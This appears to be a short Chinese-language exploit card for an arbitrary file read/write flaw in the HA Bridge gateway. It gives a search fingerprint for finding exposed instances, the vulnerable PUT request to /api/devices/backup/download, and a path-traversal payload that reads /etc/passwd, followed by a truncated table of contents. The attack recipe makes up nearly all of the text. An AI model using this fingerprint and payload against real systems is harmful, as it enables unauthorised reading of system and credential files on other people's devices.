# hi-bridge网关download存在文件读取漏洞

hi-bridge ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="HA Bridge"`
- **请求**：`PUT /api/devices/backup/download HTTP/1.1`

**Payload**
```
{"filename":"../../../../etc/passwd"}
>
```
- **其他**：hi-bridge网关download存在文件读取漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ [四、漏洞复现](#%E5%9B%9B%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E